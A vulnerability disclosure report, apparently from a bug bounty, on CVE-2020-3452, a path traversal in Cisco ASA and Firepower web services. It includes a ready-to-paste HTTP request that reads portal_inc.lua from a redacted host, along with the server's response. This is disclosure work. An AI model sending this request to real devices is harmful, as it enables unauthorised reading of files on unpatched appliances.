

# Path traversal allows arbitrary file read (CVE-2020-3452)

## Summary

A vulnerability in the web services interface of Cisco Adaptive Security Appliance (ASA) Software and Cisco Firepower Threat Defense (FTD) Software could allow an unauthenticated, remote attacker to conduct directory traversal attacks and read sensitive files on a targeted system.


## Affected assets 

$URL

## Steps To Reproduce:
 
 Let's try to read the portal_inc.lua file. 

 1. Using Burp, copy and paste the following request:
```
GET /+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua HTTP/1.1
Host: REDACTED
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="90"
Sec-Ch-Ua-Mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close




```
2. You will see the content of the file
```
HTTP/1.1 200 OK
Content-Type: application/octet-stream
Cache-Control: no-cache
Pragma: no-cache
Connection: Keep-Alive
Date: Tue, 08 Jun 2021 13:46:08 GMT
X-Frame-Options: SAMEORIGIN
Strict-Transport-Security: max-age=31536000; includeSubDomains
Content-Length: 27555

-- Copyright (C) 2006-2018 by Cisco Systems, Inc.
-- Created by otrizna@cisco.com

dofile("/+CSCOE+/include/common.lua")
**Truncated**
```

Output file is attached. 


## Impact
A successful exploit could allow the attacker to view arbitrary files within the web services file system on the targeted device.

### Supporting Material/References:
https://nvd.nist.gov/vuln/detail/CVE-2020-3452
https://hackerone.com/reports/936399

